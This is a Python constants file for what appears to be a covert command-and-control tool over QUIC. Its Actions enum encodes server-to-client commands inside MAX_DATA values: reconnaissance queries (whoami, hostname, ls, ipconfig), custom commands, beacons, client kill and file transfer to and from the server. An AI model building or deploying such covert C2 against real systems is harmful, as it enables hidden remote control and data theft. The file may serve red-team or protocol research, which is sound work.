"""Define constants to be used throughout the program."""
from enum import Enum
import platform

# This is specified by aioquic as a default in the QuicConfiguration class.
# This is the size of 1 MB in bytes (1024 * 1024).
DEFAULT_MAX_DATA = 1048576

# This is the OS version - determines which commands are run by the client.
OS = platform.system()

# This is the maximum variable-length integer encoding integer per RFC 9000
# Section 16.1 that will work successfully in this API.  The value was based
# on 2^30 - 4 (so all even values divisible by 4) and then add some zeroes
# on the end.  Can be increased later, if needed.
MAX_VLIE_INT = 107374182000

# This is the delimiter to use between commands that are sent via stream
# frames.  Necessary because the underlying parts of the API may combine
# stream frames (which is allowed per RFC 9000), hence combining the data also.
DELIMITER = '***'

# Through empirical testing, the maximum number of bytes that could succesfully
# be stuffed into a single QUIC packet is about 1,230.
MAX_BYTES = 1230


# These are the native actions that can be performed by the client.  Values on
# the end of the comments are (value x DEFAULT_MAX_DATA) in bytes.
class Actions(Enum):
    # Notice that a value of just 1 below isn't possible because that's the
    # default value above...
    CUSTOM = 1153433  # Custom action as given by the server.  1.1

    WHOAMI = 2097152  # whoami query.  2
    HOSTNAME = 2202009  # hostname query.  2.1
    PWD = 2306867  # print working directory query.  2.2
    LS = 2411724  # ls query.  2.3
    IPCONFIG = 2516582  # ipconfig query.  2.4

    NOT_A_VALID_INTEGER = 9437184  # something is wrong.  9
    NO_RESPONSE_NEEDED = 9542041  # don't wait for response.  9.1
    FILE_NOT_FOUND = 9646899  # nonexistent file.  9.2

    CLIENT_HELLO = 10485760  # saying it is alive.  10
    CLIENT_RESPONSE = 10590617  # responding to command from server.  10.1
    CLIENT_FAIL = 10695475  # something went wrong...  10.2
    CLIENT_KILL = 10800332  # kill the client.  10.3
    CLIENT_FILE_SEND = 10905190  # send file to server.  10.4

    SERVER_SEES_HELLO = 11534336  # acknowledge CLIENT_HELLO.  11
    SERVER_SEES_RESPONSE = 11639193  # acknowledge CLIENT_RESPONSE.  11.1
    SERVER_FILE_SEND = 11744051  # server has file for client.  11.2
    SERVER_FILE_RECV = 11848908  # server wants client's file.  11.3
